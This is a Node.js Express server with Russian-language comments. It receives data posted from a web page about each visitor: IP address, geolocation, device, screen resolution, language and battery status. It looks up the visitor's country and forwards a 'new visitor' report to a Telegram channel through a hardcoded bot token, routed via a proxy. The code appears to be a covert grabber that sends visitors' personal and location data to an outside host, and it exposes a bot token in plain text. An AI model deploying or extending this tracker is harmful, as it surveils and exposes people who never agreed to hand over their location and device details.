const express = require('express');
const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');
const app = express();

const TOKEN = '7962767337:AAG1w_PlojpJ8GCkTKIPvinNiGomB6gqQEo';
const CHANNEL = '@vlomvlomdata';

// Настройка прокси (найди рабочий прокси, например, через free-proxy-list.net)
const proxyAgent = new HttpsProxyAgent('http://your-proxy:port'); // Замени на свой прокси
const axiosInstance = axios.create({ httpsAgent: proxyAgent });

app.use(express.static('public'));
app.use(express.json());

async function getCountryByIp(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        if (response.data.status === 'success') {
            return {
                country: response.data.country,
                countryCode: response.data.countryCode
            };
        }
        return { country: 'Неизвестно', countryCode: null };
    } catch (error) {
        console.log('Ошибка при получении страны:', error.message);
        return { country: 'Неизвестно', countryCode: null };
    }
}

function getFlagEmoji(countryCode) {
    if (!countryCode) return '';
    const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

function parseDevice(userAgent) {
    let deviceType = 'Desktop';
    let deviceName = 'Unknown';

    if (/mobile/i.test(userAgent)) {
        deviceType = 'Mobile';
    } else if (/tablet/i.test(userAgent)) {
        deviceType = 'Tablet';
    }

    if (/iphone/i.test(userAgent)) {
        deviceName = 'iPhone';
    } else if (/ipad/i.test(userAgent)) {
        deviceName = 'iPad';
    } else if (/android/i.test(userAgent)) {
        deviceName = 'Android';
    } else if (/windows/i.test(userAgent)) {
        deviceName = 'Windows PC';
    } else if (/macintosh|mac os x/i.test(userAgent)) {
        deviceName = 'Mac';
    }

    return `${deviceName} (${deviceType})`;
}

app.post('/data', async (req, res) => {
    console.log('Запрос на /data получен');
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { userAgent, time, geolocation, screenResolution, language, battery } = req.body;

    console.log('Получены данные:', { ip, userAgent, time, geolocation, screenResolution, language, battery });

    const { country, countryCode } = await getCountryByIp(ip);
    const flag = getFlagEmoji(countryCode);
    const device = parseDevice(userAgent);

    const message = `🔔 Новый посетитель!\n` +
        `🌍 Страна: ${country} ${flag}\n` +
        `🕒 Время: ${time}\n` +
        `📱 Устройство: ${device}\n` +
        `🌐 IP: ${ip}\n` +
        `🖥️ Разрешение экрана: ${screenResolution}\n` +
        `🗣️ Язык: ${language}\n` +
        `🔋 Батарея: ${battery || 'Не предоставлена'}`;

    try {
        const response = await axiosInstance.get(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            params: {
                chat_id: CHANNEL,
                text: message
            }
        });
        console.log('Сообщение отправлено в Telegram:', response.data);
    } catch (error) {
        console.log('Пиздец, ошибка:', error.message);
        if (error.response) {
            console.log('Детали ошибки:', error.response.data);
        }
    }

    res.send('ok');
});

const port = process.env.PORT || 10000;
app.listen(port, () => console.log(`Пашет на порту ${port}`));